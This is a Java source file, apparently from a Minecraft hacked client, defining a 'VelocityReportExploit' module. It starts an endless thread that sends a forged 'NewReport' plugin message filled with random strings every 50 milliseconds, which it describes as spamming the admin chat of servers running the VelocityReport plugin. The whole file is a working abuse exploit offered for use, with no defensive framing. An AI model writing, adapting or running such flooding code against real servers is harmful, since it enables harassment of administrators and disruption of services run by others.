package net.paradise_client.exploit.impl;

import net.minecraft.client.MinecraftClient;
import net.paradise_client.Helper;
import net.paradise_client.exploit.Exploit;

import java.util.Random;

@SuppressWarnings("BusyWait") public class VelocityReportExploit extends Exploit {
  private final String CHARACTERS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%&'()*+,-./'";
  private final Random random = new Random();

  public VelocityReportExploit(MinecraftClient minecraftClient) {
    super("velocityreport", "Spams the admin chat of an admin using the VelocityReport plugin.", minecraftClient);
  }

  @Override public void execute() {
    Helper.printChatMessage("Spamming VelocityReport plugin...");
    new Thread(() -> {
      while (true) {
        String s = Helper.generateRandomString(12, CHARACTERS, random);

        Helper.sendPluginMessage("velocityreport:main",
          out -> out.writeUTF(
            "{\"reporter\": \"{a}\", \"reported\":\"{b}\", \"server\":\"{c}\", \"reason\":\"{d}\", \"type\":\"NewReport\"}".replace(
              "{a}",
              s).replace("{b}", s).replace("{c}", s).replace("{d}", s)));
        try {
          Thread.sleep(50);
        } catch (Exception ignored) {
          Helper.printChatMessage("[CrashExploit] [VelocityReport] Unable to sleep 50ms");
        }
      }
    }).start();
  }
}
